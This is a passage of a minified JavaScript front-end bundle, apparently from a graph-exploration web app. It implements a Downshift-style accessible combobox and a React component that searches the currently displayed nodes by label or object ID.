We(n,r,a,s){const{items:i,initialHighlightedIndex:c,defaultHighlightedIndex:d}=n,{selectedItem:u,highlightedIndex:g}=r;return i.length===0?-1:c!==void 0&&g===c?c:d!==void 0?d:u?a===0?i.indexOf(u):Je(a,i.indexOf(u),i.length,s,!1):a===0?-1:a<0?i.length-1:0}function Wl(n,r,a,s){const i=p.useRef({isMouseDown:!1,isTouchMove:!1});return p.useEffect(()=>{const c=()=>{i.current.isMouseDown=!0},d=P=>{i.current.isMouseDown=!1,n&&!jt(P.target,r.map(A=>A.current),a)&&s()},u=()=>{i.current.isTouchMove=!1},g=()=>{i.current.isTouchMove=!0},D=P=>{n&&!i.current.isTouchMove&&!jt(P.target,r.map(A=>A.current),a,!1)&&s()};return a.addEventListener("mousedown",c),a.addEventListener("mouseup",d),a.addEventListener("touchstart",u),a.addEventListener("touchmove",g),a.addEventListener("touchend",D),function(){a.removeEventListener("mousedown",c),a.removeEventListener("mouseup",d),a.removeEventListener("touchstart",u),a.removeEventListener("touchmove",g),a.removeEventListener("touchend",D)}},[n,a]),i}let zl=()=>tt;function vt(n,r,a){let{isInitialMount:s,highlightedIndex:i,items:c,environment:d,...u}=a;p.useEffect(()=>{s||Ml(()=>n({highlightedIndex:i,highlightedItem:c[i],resultCount:c.length,...u}),d.document)},r)}function Bl(n){let{highlightedIndex:r,isOpen:a,itemRefs:s,getItemNodeFromIndex:i,menuElement:c,scrollIntoView:d}=n;const u=p.useRef(!0);return Gl(()=>{r<0||!a||!Object.keys(s.current).length||(u.current===!1?u.current=!0:d(i(r),c))},[r]),u}let Nl=tt;function Vl(n,r,a){const{type:s,props:i}=r;let c;switch(s){case a.ItemMouseMove:c={highlightedIndex:r.disabled?-1:r.index};break;case a.MenuMouseLeave:c={highlightedIndex:-1};break;case a.ToggleButtonClick:case a.FunctionToggleMenu:c={isOpen:!n.isOpen,highlightedIndex:n.isOpen?-1:We(i,n,0)};break;case a.FunctionOpenMenu:c={isOpen:!0,highlightedIndex:We(i,n,0)};break;case a.FunctionCloseMenu:c={isOpen:!1};break;case a.FunctionSetHighlightedIndex:c={highlightedIndex:r.highlightedIndex};break;case a.FunctionSetInputValue:c={inputValue:r.inputValue};break;case a.FunctionReset:c={highlightedIndex:Y(i,"highlightedIndex"),isOpen:Y(i,"isOpen"),selectedItem:Y(i,"selectedItem"),inputValue:Y(i,"inputValue")};break;default:throw new Error("Reducer called without proper action type.")}return{...n,...c}}l.array.isRequired,l.func,l.func,l.func,l.bool,l.number,l.number,l.number,l.bool,l.bool,l.bool,l.any,l.any,l.any,l.string,l.string,l.string,l.func,l.string,l.func,l.func,l.func,l.func,l.func,l.shape({addEventListener:l.func,removeEventListener:l.func,document:l.shape({getElementById:l.func,activeElement:l.any,body:l.any})});function Kl(n){var r=n.isOpen,a=n.resultCount,s=n.previousResultCount;return r?a?a!==s?"".concat(a," result").concat(a===1?" is":"s are"," available, use up and down arrow keys to navigate. Press Enter or Space Bar keys to select."):"":"No results are available.":""}yt(yt({},Ae),{getA11yStatusMessage:Kl});const rt=0,ot=1,at=2,st=3,it=4,ct=5,dt=6,ze=7,Ut=8,_t=9,lt=10,Lt=11,Wt=12,zt=13,Bt=14,Nt=15,ht=16,Vt=17,Kt=18,pt=19;var Ht=Object.freeze({__proto__:null,InputKeyDownArrowDown:rt,InputKeyDownArrowUp:ot,InputKeyDownEscape:at,InputKeyDownHome:st,InputKeyDownEnd:it,InputKeyDownEnter:ct,InputChange:dt,InputBlur:ze,MenuMouseLeave:Ut,ItemMouseMove:_t,ItemClick:lt,ToggleButtonClick:Lt,FunctionToggleMenu:Wt,FunctionOpenMenu:zt,FunctionCloseMenu:Bt,FunctionSetHighlightedIndex:Nt,FunctionSelectItem:ht,FunctionSetInputValue:Vt,FunctionReset:Kt,ControlledPropUpdatedSelectedItem:pt});function Hl(n){const r=Ll(n),{selectedItem:a}=r;let{inputValue:s}=r;return s===""&&a&&n.defaultInputValue===void 0&&n.initialInputValue===void 0&&n.inputValue===void 0&&(s=n.itemToString(a)),{...r,inputValue:s}}l.array.isRequired,l.func,l.func,l.func,l.bool,l.number,l.number,l.number,l.bool,l.bool,l.bool,l.any,l.any,l.any,l.string,l.string,l.string,l.string,l.string,l.string,l.func,l.string,l.string,l.func,l.func,l.func,l.func,l.func,l.func,l.shape({addEventListener:l.func,removeEventListener:l.func,document:l.shape({getElementById:l.func,activeElement:l.any,body:l.any})});function ql(n,r,a){const s=p.useRef(),[i,c]=_l(n,r,a);return p.useEffect(()=>{Mt(a,"selectedItem")&&(s.current!==a.selectedItem&&c({type:pt,inputValue:a.itemToString(a.selectedItem)}),s.current=i.selectedItem===s.current?a.selectedItem:i.selectedItem)}),[Ye(i,a),c]}let Yl=tt;const Jl={...Ae,getA11yStatusMessage:Tl,circularNavigation:!0};function Xl(n,r){const{type:a,props:s,shiftKey:i}=r;let c;switch(a){case lt:c={isOpen:Y(s,"isOpen"),highlightedIndex:Y(s,"highlightedIndex"),selectedItem:s.items[r.index],inputValue:s.itemToString(s.items[r.index])};break;case rt:n.isOpen?c={highlightedIndex:Je(i?5:1,n.highlightedIndex,s.items.length,r.getItemNodeFromIndex,s.circularNavigation)}:c={highlightedIndex:We(s,n,1,r.getItemNodeFromIndex),isOpen:s.items.length>=0};break;case ot:n.isOpen?c={highlightedIndex:Je(i?-5:-1,n.highlightedIndex,s.items.length,r.getItemNodeFromIndex,s.circularNavigation)}:c={highlightedIndex:We(s,n,-1,r.getItemNodeFromIndex),isOpen:s.items.length>=0};break;case ct:c={...n.isOpen&&n.highlightedIndex>=0&&{selectedItem:s.items[n.highlightedIndex],isOpen:Y(s,"isOpen"),highlightedIndex:Y(s,"highlightedIndex"),inputValue:s.itemToString(s.items[n.highlightedIndex])}};break;case at:c={isOpen:!1,highlightedIndex:-1,...!n.isOpen&&{selectedItem:null,inputValue:""}};break;case st:c={highlightedIndex:Se(1,0,s.items.length,r.getItemNodeFromIndex,!1)};break;case it:c={highlightedIndex:Se(-1,s.items.length-1,s.items.length,r.getItemNodeFromIndex,!1)};break;case ze:c={isOpen:!1,highlightedIndex:-1,...n.highlightedIndex>=0&&r.selectItem&&{selectedItem:s.items[n.highlightedIndex],inputValue:s.itemToString(s.items[n.highlightedIndex])}};break;case dt:c={isOpen:!0,highlightedIndex:Y(s,"highlightedIndex"),inputValue:r.inputValue};break;case ht:c={selectedItem:r.selectedItem,inputValue:s.itemToString(r.selectedItem)};break;case pt:c={inputValue:r.inputValue};break;default:return Vl(n,r,Ht)}return{...n,...c}}Xe.stateChangeTypes=Ht;function Xe(n){n===void 0&&(n={}),Yl();const r={...Jl,...n},{initialIsOpen:a,defaultIsOpen:s,items:i,scrollIntoView:c,environment:d,getA11yStatusMessage:u,getA11ySelectionMessage:g,itemToString:D}=r,P=Hl(r),[A,m]=ql(Xl,P,r),{isOpen:w,highlightedIndex:C,selectedItem:U,inputValue:_}=A,G=p.useRef(null),M=p.useRef({}),E=p.useRef(null),x=p.useRef(null),L=p.useRef(null),R=p.useRef(!0),j=El(r),H=p.useRef(),v=Ft({state:A,props:r}),O=p.useCallback(b=>M.current[j.getItemId(b)],[j]);vt(u,[w,C,_,i],{isInitialMount:R.current,previousResultCount:H.current,items:i,environment:d,itemToString:D,...A}),vt(g,[U],{isInitialMount:R.current,previousResultCount:H.current,items:i,environment:d,itemToString:D,...A});const ne=Bl({menuElement:G.current,highlightedIndex:C,isOpen:w,itemRefs:M,scrollIntoView:c,getItemNodeFromIndex:O});Nl({isInitialMount:R.current,props:r,state:A}),p.useEffect(()=>{(a||s||w)&&E.current&&E.current.focus()},[]),p.useEffect(()=>{R.current||(H.current=i.length)});const re=Wl(w,[L,G,x],d,()=>{m({type:ze,selectItem:!1})}),T=zl();p.useEffect(()=>{R.current=!1},[]),p.useEffect(()=>{w||(M.current={})},[w]);const q=p.useMemo(()=>({ArrowDown(b){b.preventDefault(),m({type:rt,shiftKey:b.shiftKey,getItemNodeFromIndex:O})},ArrowUp(b){b.preventDefault(),m({type:ot,shiftKey:b.shiftKey,getItemNodeFromIndex:O})},Home(b){v.current.state.isOpen&&(b.preventDefault(),m({type:st,getItemNodeFromIndex:O}))},End(b){v.current.state.isOpen&&(b.preventDefault(),m({type:it,getItemNodeFromIndex:O}))},Escape(b){const $=v.current.state;($.isOpen||$.inputValue||$.selectedItem||$.highlightedIndex>-1)&&(b.preventDefault(),m({type:at}))},Enter(b){const $=v.current.state;!$.isOpen||$.highlightedIndex<0||b.which===229||(b.preventDefault(),m({type:ct,getItemNodeFromIndex:O}))}}),[m,v,O]),oe=p.useCallback(b=>({id:j.labelId,htmlFor:j.inputId,...b}),[j]),ae=p.useCallback(function(b,$){let{onMouseLeave:W,refKey:N="ref",ref:V,...B}=b===void 0?{}:b;return{[N]:xe(V,Q=>{G.current=Q}),id:j.menuId,role:"listbox","aria-labelledby":j.labelId,onMouseLeave:ee(W,()=>{m({type:Ut})}),...B}},[m,T,j]),se=p.useCallback(function(b){let{item:$,index:W,refKey:N="ref",ref:V,onMouseMove:B,onMouseDown:Q,onClick:ye,onPress:ut,disabled:ue,...te}=b===void 0?{}:b;const{props:Ve,state:Me}=v.current,me=Fl(W,$,Ve.items);if(me<0)throw new Error("Pass either item or item index in getItemProps!");const Ke="onClick",Ge=ye,Z=()=>{W!==Me.highlightedIndex&&(ne.current=!1,m({type:_t,index:W,disabled:ue}))},fe=()=>{m({type:lt,index:W})},qt=Ee=>Ee.preventDefault();return{[N]:xe(V,Ee=>{Ee&&(M.current[j.getItemId(me)]=Ee)}),disabled:ue,role:"option","aria-selected":`${me===Me.highlightedIndex}`,id:j.getItemId(me),...!ue&&{[Ke]:ee(Ge,fe)},onMouseMove:ee(B,Z),onMouseDown:ee(Q,qt),...te}},[m,v,ne,j]),be=p.useCallback(function(b){let{onClick:$,onPress:W,refKey:N="ref",ref:V,...B}=b===void 0?{}:b;const Q=()=>{m({type:Lt}),!v.current.state.isOpen&&E.current&&E.current.focus()};return{[N]:xe(V,ye=>{x.current=ye}),id:j.toggleButtonId,tabIndex:-1,...!B.disabled&&{onClick:ee($,Q)},...B}},[m,v,j]),ge=p.useCallback(function(b,$){let{onKeyDown:W,onChange:N,onInput:V,onBlur:B,onChangeText:Q,refKey:ye="ref",ref:ut,...ue}=b===void 0?{}:b;const te=v.current.state,Ve=Z=>{const fe=Pl(Z);fe&&q[fe]&&q[fe](Z)},Me=Z=>{m({type:dt,inputValue:Z.target.value})},me=()=>{te.isOpen&&!re.current.isMouseDown&&m({type:ze,selectItem:!0})},Ke="onChange";let Ge={};return ue.disabled||(Ge={[Ke]:ee(N,V,Me),onKeyDown:ee(W,Ve),onBlur:ee(B,me)}),{[ye]:xe(ut,Z=>{E.current=Z}),id:j.inputId,"aria-autocomplete":"list","aria-controls":j.menuId,...te.isOpen&&te.highlightedIndex>-1&&{"aria-activedescendant":j.getItemId(te.highlightedIndex)},"aria-labelledby":j.labelId,autoComplete:"off",value:te.inputValue,...Ge,...ue}},[m,q,v,re,T,j]),ie=p.useCallback(function(b,$){let{refKey:W="ref",ref:N,...V}=b===void 0?{}:b;return{[W]:xe(N,B=>{L.current=B}),role:"combobox","aria-haspopup":"listbox","aria-owns":j.menuId,"aria-expanded":v.current.state.isOpen,...V}},[v,T,j]),ce=p.useCallback(()=>{m({type:Wt})},[m]),de=p.useCallback(()=>{m({type:Bt})},[m]),le=p.useCallback(()=>{m({type:zt})},[m]),he=p.useCallback(b=>{m({type:Nt,highlightedIndex:b})},[m]),pe=p.useCallback(b=>{m({type:ht,selectedItem:b})},[m]),J=p.useCallback(b=>{m({type:Vt,inputValue:b})},[m]),X=p.useCallback(()=>{m({type:Kt})},[m]);return{getItemProps:se,getLabelProps:oe,getMenuProps:ae,getInputProps:ge,getComboboxProps:ie,getToggleButtonProps:be,toggleMenu:ce,openMenu:le,closeMenu:de,setHighlightedIndex:he,setInputValue:J,selectItem:pe,reset:X,highlightedIndex:C,isOpen:w,selectedItem:U,inputValue:_}}function Ql(n){const{removedSelectedItem:r,itemToString:a}=n;return`${a(r)} has been removed.`}l.array,l.array,l.array,l.func,l.func,l.func,l.number,l.number,l.number,l.func,l.func,l.string,l.string,l.shape({addEventListener:l.func,removeEventListener:l.func,document:l.shape({getElementById:l.func,activeElement:l.any,body:l.any})});Ae.itemToString,Ae.stateReducer,Ae.environment;const Zl=({item:n,index:r,highlightedIndex:a,keyword:s,getItemProps:i})=>e.jsx(y,{button:!0,dense:!0,selected:a?a===r:!1,"data-testid":"explore_search_result-list-item",...i({item:n,index:r}),children:e.jsx(f,{primary:e.jsxs(h,{style:{width:"100%",display:"flex",alignItems:"center"},children:[e.jsx(An,{nodeType:n.kind}),e.jsx(h,{style:{flexGrow:1,marginRight:"1em"},children:e.jsx(Zd,{text:n.label||n.objectId,search:s})})]}),primaryTypographyProps:{style:{whiteSpace:"nowrap",verticalAlign:"center"}}})},n.objectId),eh=(n,r)=>{p.useEffect(()=>{const a=s=>{!n.current||n.current.contains(s.target)||r(s)};return document.addEventListener("mousedown",a),document.addEventListener("touchstart",a),()=>{document.removeEventListener("mousedown",a),document.removeEventListener("touchstart",a)}},[n,r])},th="Search Current Results",nh="No result found in current results",At=38,qe=350,uh=({sx:n,currentNodes:r,onSelect:a,onClose:s})=>{const i=p.useRef(null),c=p.useRef(null),[d,u]=p.useState([]),[g,D]=p.useState([]),[P,A]=p.useState(null),[m,w]=p.useState(0);p.useEffect(()=>{const x=Object.entries(r).map(([L,R])=>({id:L,...R}));u(x)},[r]),p.useEffect(()=>{var x;return(x=c.current)==null?void 0:x.focus()},[]),p.useEffect(()=>{P&&a(P)},[P,a]),p.useEffect(()=>{const x=At*g.length;x>qe?w(qe-10):w(x)},[g]),eh(i,()=>s&&s());const{getInputProps:C,getMenuProps:U,getComboboxProps:_,getItemProps:G,inputValue:M}=Xe({items:g,onInputValueChange:({inputValue:x})=>{const L=d.filter(R=>{const j=R.label.toLowerCase(),H=R.objectId.toLowerCase(),v=(x==null?void 0:x.toLowerCase())||"";return x===""?!1:j.includes(v)||H.includes(v)});D(L)},stateReducer:(x,L)=>{const{changes:R,type:j}=L;switch(j){case Xe.stateChangeTypes.ItemClick:return R.selectedItem&&A(R.selectedItem),{...R,inputValue:""};default:return R}}}),E=({index:x,style:L})=>e.jsx(h,{style:L,overflow:"hidden",children:e.jsx(Zl,{item:g[x],index:x,highlightedIndex:0,keyword:M,getItemProps:G},x)});return e.jsx("div",{ref:i,children:e.jsxs(h,{component:Sn,...n,..._(),children:[e.jsx(h,{overflow:"auto",maxHeight:qe,marginBottom:g.length===0?0:1,children:e.jsxs(z,{"data-testid":"current-results-list",dense:!0,...U({hidden:g.length===0&&!M,style:{paddingTop:0}}),children:[e.jsx(kn,{height:m,width:"100%",itemSize:At,itemCount:g.length,children:E}),g.length===0&&M&&e.jsx(y,{disabled:!0,sx:{fontSize:14},children:nh})]})}),e.jsx(Tn,{inputRef:c,placeholder:th,variant:"outlined",size:"small",fullWidth:!0,...C(),InputProps:{sx:{fontSize:14}}})]})})};export{Tt as A,ih as E,sh as G,Zd as H,In as L,ch as N,sl as P,uh as S,ph as a,Xe as b,Zl as c,th as d,dh as e,lh as f,nh as g,eh as h,il as i,cl as j,dl as k,ll as l,hl as m,el as n,tl as o,nl as p,rl as q,ol as r,Ze as s,al as t,hh as u};
